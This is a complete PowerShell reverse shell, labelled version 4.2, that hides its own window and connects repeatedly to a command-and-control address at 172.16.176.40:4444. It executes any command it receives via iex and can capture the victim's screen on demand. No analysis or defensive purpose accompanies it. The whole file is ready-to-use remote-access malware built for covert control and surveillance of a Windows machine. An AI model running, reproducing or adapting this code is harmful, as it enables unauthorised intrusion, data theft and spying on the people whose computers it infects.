# Pico reverse shell v4.2 - Added Screenshot & Touch Alias
# C2: 172.16.176.40:4444

$m = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -PassThru
$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# Add a 'touch' alias so you stop getting errors
if (-not (Get-Command touch -ErrorAction SilentlyContinue)) {
    New-Alias -Name touch -Value New-Item -Force
}

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        $p = $e.GetBytes("Connected. Commands: 'screenshot', 'kill', or standard PS.`nPS $PWD> ")
        $s.Write($p, 0, $p.Length)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $d = $e.GetString($b, 0, $i).Trim()
            $out = ""

            if ($d -eq 'kill') {
                Stop-Process -Id $PID -Force
            } 
            # --- CUSTOM SCREENSHOT HANDLER ---
            elseif ($d -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
                    $Top    = $Screen.Bounds.Top
                    $Left   = $Screen.Bounds.Left
                    $Width  = $Screen.Bounds.Width
                    $Height = $Screen.Bounds.Height
                    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
                    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
                    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
                    $Path = "$env:TEMP\sc.png"
                    $Bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
                    $Graphic.Dispose(); $Bitmap.Dispose()
                    $out = "Screenshot saved to: $Path`n"
                } catch { $out = "Screenshot failed: $($_.Exception.Message)`n" }
            }
            else {
                $out = try { if ($d) { iex $d 2>&1 | Out-String } } catch { $_.Exception.Message }
            }

            $resp = $e.GetBytes($out + "PS $PWD> ")
            $s.Write($resp, 0, $resp.Length); $s.Flush()
        }
    } catch { Start-Sleep 5 }
}
